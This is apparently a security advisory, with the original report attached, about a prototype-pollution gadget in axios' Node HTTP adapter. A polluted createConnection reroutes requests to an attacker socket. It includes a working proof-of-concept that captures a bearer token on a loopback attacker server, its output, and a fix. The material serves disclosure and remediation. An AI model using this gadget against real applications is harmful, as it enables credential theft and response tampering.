                "markdown": "## Summary\n\nAxios' Node HTTP adapter can act as a read-side prototype-pollution gadget for Node's sensitive `createConnection` request option. The adapter creates a null-prototype options object, but Node's HTTP client can copy or normalize request options into ordinary objects before connection creation. If `Object.prototype.createConnection` has been polluted elsewhere in the same process, Node can call the inherited function and create a socket to an attacker-controlled endpoint.\n\nAxios does not create the prototype pollution source. The vulnerability is that axios does not set an own safe value for a sensitive transport option before handing options to Node.\n\n## Impact\n\nGiven a prior same-process prototype-pollution primitive, an attacker can redirect later axios Node HTTP requests at the socket layer while the request URL and axios config still appear to target the legitimate origin. The attacker-controlled endpoint can receive request headers and bodies, including Authorization headers, cookies, API keys, and service credentials, and can return attacker-controlled responses to the application.\n\nThis can bypass application destination validation that checks the URL before calling axios, because the URL remains legitimate while the underlying socket goes elsewhere.\n\n## Affected Functionality\n\nAffected:\n\n- Node.js HTTP adapter.\n- HTTP and HTTPS request paths that rely on Node/follow-redirects option processing and do not set an own safe `createConnection`.\n- Processes where `Object.prototype.createConnection` is polluted.\n\nNot affected:\n\n- Browser adapters.\n- Processes without prototype pollution.\n- Requests using a custom trusted transport that ignores inherited `createConnection` and sanitizes options internally.\n\n## Technical Details\n\n`lib/adapters/http.js` creates:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method,\n  headers,\n  agents: { http: httpAgent, https: httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n});\n```\n\nThe object does not include an own `createConnection` property. Local verification on axios `1.18.1` polluted `Object.prototype.createConnection` to connect to an attacker loopback server. A request to a legitimate loopback server with an Authorization header returned the attacker's response; the legitimate server received no request and the attacker server received `Bearer SECRET`.\n\n## Proof of Concept of Attack\n\nConstrained local demonstration:\n\n```js\nObject.prototype.createConnection = function (_options, cb) {\n  const socket = net.createConnection({ host: '127.0.0.1', port: attackerPort }, () =\u003e {\n    if (typeof cb === 'function') cb(null, socket);\n  });\n  return socket;\n};\n\nawait axios.get('http://127.0.0.1:\u003clegit-port\u003e/secret', {\n  headers: { Authorization: 'Bearer SECRET' },\n  proxy: false\n});\n```\n\nExpected safe behavior is that the legitimate server receives the request. Current affected behavior lets the attacker server receive the request and return the response.\n\n## Workarounds\n\nRun axios in a process where prototype pollution is not present. For high-risk internal clients, use a custom trusted transport or agent layer that sets and enforces its own connection creation behavior instead of allowing inherited Node request options to participate.\n\n\u003cdetails\u003e\n  \u003csummary\u003e\u003ch3\u003eOriginal report\u003c/h3\u003e\u003c/summary\u003e\n  \n## Summary\n\nAxios' Node HTTP adapter remains exploitable as a read-side prototype-pollution gadget after the recent null-prototype hardening. This is not a claim that axios creates the prototype pollution source. The precondition is a separate upstream prototype pollution primitive in the same Node.js process.\n\nWhen `Object.prototype.createConnection` is polluted, axios requests can be redirected to an attacker-controlled socket even though the adapter builds the request options with `Object.create(null)`. The request URL and axios config still appear to target the legitimate host, but the actual socket is attacker-controlled.\n\nThis allows credential exfiltration and response manipulation for later axios HTTP requests in a polluted process.\n\n## Impact\n\nGiven an upstream prototype pollution primitive in the same process, an attacker can turn later axios HTTP requests into a man-in-the-middle primitive:\n\n- redirect the underlying socket for axios requests to attacker-controlled infrastructure\n- receive headers and request bodies intended for the legitimate target, including bearer tokens, cookies, API keys, and service credentials\n- return attacker-controlled responses to the caller\n- bypass application SSRF controls that validate the URL before calling axios, because the requested URL remains legitimate while the socket connects elsewhere\n\nThe important boundary here is axios' documented/read-side prototype-pollution hardening. The project threat model discusses polluted `Object.prototype` from transitive dependencies as an in-scope read-side gadget class where axios should avoid picking up inherited behavior-changing properties. This issue is a bypass of that hardening at the Node HTTP request-options boundary.\n\n## Technical details\n\nThe HTTP adapter constructs a null-prototype request options object before calling the selected transport:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method: method,\n  headers: toByteStringHeaderObject(headers),\n  agents: { http: config.httpAgent, https: config.httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n});\n```\n\nThat prevents direct inherited reads while the options object remains null-prototype. However, Node's HTTP client path copies or normalizes request options into ordinary objects before connection creation. After that copy, missing properties can resolve from `Object.prototype` again.\n\n`createConnection` is a sensitive Node HTTP option. If it is inherited after this copy, Node calls the attacker-supplied function to create the socket.\n\n## Reproduction\n\nThe following minimal proof uses a legitimate target server and an attacker server. It pollutes `Object.prototype.createConnection`, then makes an axios request to the legitimate server with an Authorization header.\n\n```js\nimport net from 'node:net';\nimport http from 'node:http';\nimport axios from 'axios';\n\nfunction listen(handler) {\n  return new Promise(resolve =\u003e {\n    const s = http.createServer(handler);\n    s.listen(0, '127.0.0.1', () =\u003e resolve(s));\n  });\n}\n\nconst legitHits = [];\nconst attackerHits = [];\n\nconst legit = await listen((req, res) =\u003e {\n  legitHits.push({url: req.url, auth: req.headers.authorization || null});\n  res.end('LEGIT');\n});\n\nconst attacker = await listen((req, res) =\u003e {\n  attackerHits.push({url: req.url, auth: req.headers.authorization || null});\n  res.end('ATTACKER');\n});\n\nObject.prototype.createConnection = function(options, cb) {\n  const sock = net.createConnection({\n    host: '127.0.0.1',\n    port: attacker.address().port,\n  }, () =\u003e {\n    if (typeof cb === 'function') cb(null, sock);\n  });\n  return sock;\n};\n\nconst res = await axios.get(`http://127.0.0.1:${legit.address().port}/secret`, {\n  headers: {Authorization: 'Bearer SECRET'},\n  proxy: false,\n});\n\nconsole.log({\n  response: res.data,\n  legitHits,\n  attackerHits,\n});\n```\n\nObserved result on the current npm package:\n\n```json\n{\n  \"response\": \"ATTACKER\",\n  \"legitHits\": [],\n  \"attackerHits\": [\n    {\n      \"url\": \"/secret\",\n      \"auth\": \"Bearer SECRET\"\n    }\n  ]\n}\n```\n\nThe request never reached the intended target. The attacker-controlled server received the Authorization header and supplied the response body returned by axios.\n\n## Versions tested\n\nI reproduced this against:\n\n- axios 1.16.1 from npm\n- axios 1.17.0 from npm\n- current `v1.x` source at commit `a8e4f13aeecc45a3b8fab3ecfd9ddb5d70fb772b`\n\n## Fix validation\n\nAdding an own safe value for `createConnection` to the adapter options object prevents inherited pollution from being observed after Node's option copy:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method: method,\n  headers: toByteStringHeaderObject(headers),\n  agents: { http: config.httpAgent, https: config.httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n  createConnection: undefined,\n});\n```\n\nWith that guard in place, the same proof no longer calls the polluted function. The legitimate server receives the request, the attacker server receives nothing, and axios returns the legitimate response.\n\n## Remediation\n\nSet own safe defaults for sensitive Node HTTP request options before calling `transport.request`, at minimum:\n\n```js\ncreateConnection: undefined\n```\n\nI recommend reviewing other sensitive Node HTTP options that may be read after Node copies the request options into a normal object, especially connection/TLS-affecting fields such as `lookup`, `timeout`, `localAddress`, `servername`, `signal`, and related options.\n\u003c/details\u003e\n\n---",
                "text": "## Summary\n\nAxios' Node HTTP adapter can act as a read-side prototype-pollution gadget for Node's sensitive `createConnection` request option. The adapter creates a null-prototype options object, but Node's HTTP client can copy or normalize request options into ordinary objects before connection creation. If `Object.prototype.createConnection` has been polluted elsewhere in the same process, Node can call the inherited function and create a socket to an attacker-controlled endpoint.\n\nAxios does not create the prototype pollution source. The vulnerability is that axios does not set an own safe value for a sensitive transport option before handing options to Node.\n\n## Impact\n\nGiven a prior same-process prototype-pollution primitive, an attacker can redirect later axios Node HTTP requests at the socket layer while the request URL and axios config still appear to target the legitimate origin. The attacker-controlled endpoint can receive request headers and bodies, including Authorization headers, cookies, API keys, and service credentials, and can return attacker-controlled responses to the application.\n\nThis can bypass application destination validation that checks the URL before calling axios, because the URL remains legitimate while the underlying socket goes elsewhere.\n\n## Affected Functionality\n\nAffected:\n\n- Node.js HTTP adapter.\n- HTTP and HTTPS request paths that rely on Node/follow-redirects option processing and do not set an own safe `createConnection`.\n- Processes where `Object.prototype.createConnection` is polluted.\n\nNot affected:\n\n- Browser adapters.\n- Processes without prototype pollution.\n- Requests using a custom trusted transport that ignores inherited `createConnection` and sanitizes options internally.\n\n## Technical Details\n\n`lib/adapters/http.js` creates:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method,\n  headers,\n  agents: { http: httpAgent, https: httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n});\n```\n\nThe object does not include an own `createConnection` property. Local verification on axios `1.18.1` polluted `Object.prototype.createConnection` to connect to an attacker loopback server. A request to a legitimate loopback server with an Authorization header returned the attacker's response; the legitimate server received no request and the attacker server received `Bearer SECRET`.\n\n## Proof of Concept of Attack\n\nConstrained local demonstration:\n\n```js\nObject.prototype.createConnection = function (_options, cb) {\n  const socket = net.createConnection({ host: '127.0.0.1', port: attackerPort }, () =\u003e {\n    if (typeof cb === 'function') cb(null, socket);\n  });\n  return socket;\n};\n\nawait axios.get('http://127.0.0.1:\u003clegit-port\u003e/secret', {\n  headers: { Authorization: 'Bearer SECRET' },\n  proxy: false\n});\n```\n\nExpected safe behavior is that the legitimate server receives the request. Current affected behavior lets the attacker server receive the request and return the response.\n\n## Workarounds\n\nRun axios in a process where prototype pollution is not present. For high-risk internal clients, use a custom trusted transport or agent layer that sets and enforces its own connection creation behavior instead of allowing inherited Node request options to participate.\n\n\u003cdetails\u003e\n  \u003csummary\u003e\u003ch3\u003eOriginal report\u003c/h3\u003e\u003c/summary\u003e\n  \n## Summary\n\nAxios' Node HTTP adapter remains exploitable as a read-side prototype-pollution gadget after the recent null-prototype hardening. This is not a claim that axios creates the prototype pollution source. The precondition is a separate upstream prototype pollution primitive in the same Node.js process.\n\nWhen `Object.prototype.createConnection` is polluted, axios requests can be redirected to an attacker-controlled socket even though the adapter builds the request options with `Object.create(null)`. The request URL and axios config still appear to target the legitimate host, but the actual socket is attacker-controlled.\n\nThis allows credential exfiltration and response manipulation for later axios HTTP requests in a polluted process.\n\n## Impact\n\nGiven an upstream prototype pollution primitive in the same process, an attacker can turn later axios HTTP requests into a man-in-the-middle primitive:\n\n- redirect the underlying socket for axios requests to attacker-controlled infrastructure\n- receive headers and request bodies intended for the legitimate target, including bearer tokens, cookies, API keys, and service credentials\n- return attacker-controlled responses to the caller\n- bypass application SSRF controls that validate the URL before calling axios, because the requested URL remains legitimate while the socket connects elsewhere\n\nThe important boundary here is axios' documented/read-side prototype-pollution hardening. The project threat model discusses polluted `Object.prototype` from transitive dependencies as an in-scope read-side gadget class where axios should avoid picking up inherited behavior-changing properties. This issue is a bypass of that hardening at the Node HTTP request-options boundary.\n\n## Technical details\n\nThe HTTP adapter constructs a null-prototype request options object before calling the selected transport:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method: method,\n  headers: toByteStringHeaderObject(headers),\n  agents: { http: config.httpAgent, https: config.httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n});\n```\n\nThat prevents direct inherited reads while the options object remains null-prototype. However, Node's HTTP client path copies or normalizes request options into ordinary objects before connection creation. After that copy, missing properties can resolve from `Object.prototype` again.\n\n`createConnection` is a sensitive Node HTTP option. If it is inherited after this copy, Node calls the attacker-supplied function to create the socket.\n\n## Reproduction\n\nThe following minimal proof uses a legitimate target server and an attacker server. It pollutes `Object.prototype.createConnection`, then makes an axios request to the legitimate server with an Authorization header.\n\n```js\nimport net from 'node:net';\nimport http from 'node:http';\nimport axios from 'axios';\n\nfunction listen(handler) {\n  return new Promise(resolve =\u003e {\n    const s = http.createServer(handler);\n    s.listen(0, '127.0.0.1', () =\u003e resolve(s));\n  });\n}\n\nconst legitHits = [];\nconst attackerHits = [];\n\nconst legit = await listen((req, res) =\u003e {\n  legitHits.push({url: req.url, auth: req.headers.authorization || null});\n  res.end('LEGIT');\n});\n\nconst attacker = await listen((req, res) =\u003e {\n  attackerHits.push({url: req.url, auth: req.headers.authorization || null});\n  res.end('ATTACKER');\n});\n\nObject.prototype.createConnection = function(options, cb) {\n  const sock = net.createConnection({\n    host: '127.0.0.1',\n    port: attacker.address().port,\n  }, () =\u003e {\n    if (typeof cb === 'function') cb(null, sock);\n  });\n  return sock;\n};\n\nconst res = await axios.get(`http://127.0.0.1:${legit.address().port}/secret`, {\n  headers: {Authorization: 'Bearer SECRET'},\n  proxy: false,\n});\n\nconsole.log({\n  response: res.data,\n  legitHits,\n  attackerHits,\n});\n```\n\nObserved result on the current npm package:\n\n```json\n{\n  \"response\": \"ATTACKER\",\n  \"legitHits\": [],\n  \"attackerHits\": [\n    {\n      \"url\": \"/secret\",\n      \"auth\": \"Bearer SECRET\"\n    }\n  ]\n}\n```\n\nThe request never reached the intended target. The attacker-controlled server received the Authorization header and supplied the response body returned by axios.\n\n## Versions tested\n\nI reproduced this against:\n\n- axios 1.16.1 from npm\n- axios 1.17.0 from npm\n- current `v1.x` source at commit `a8e4f13aeecc45a3b8fab3ecfd9ddb5d70fb772b`\n\n## Fix validation\n\nAdding an own safe value for `createConnection` to the adapter options object prevents inherited pollution from being observed after Node's option copy:\n\n```js\nconst options = Object.assign(Object.create(null), {\n  path,\n  method: method,\n  headers: toByteStringHeaderObject(headers),\n  agents: { http: config.httpAgent, https: config.httpsAgent },\n  auth,\n  protocol,\n  family,\n  beforeRedirect: dispatchBeforeRedirect,\n  beforeRedirects: Object.create(null),\n  http2Options,\n  createConnection: undefined,\n});\n```\n\nWith that guard in place, the same proof no longer calls the polluted function. The legitimate server receives the request, the attacker server receives nothing, and axios returns the legitimate response.\n\n## Remediation\n\nSet own safe defaults for sensitive Node HTTP request options before calling `transport.request`, at minimum:\n\n```js\ncreateConnection: undefined\n```\n\nI recommend reviewing other sensitive Node HTTP options that may be read after Node copies the request options into a normal object, especially connection/TLS-affecting fields such as `lookup`, `timeout`, `localAddress`, `servername`, `signal`, and related options.\n\u003c/details\u003e\n\n---"
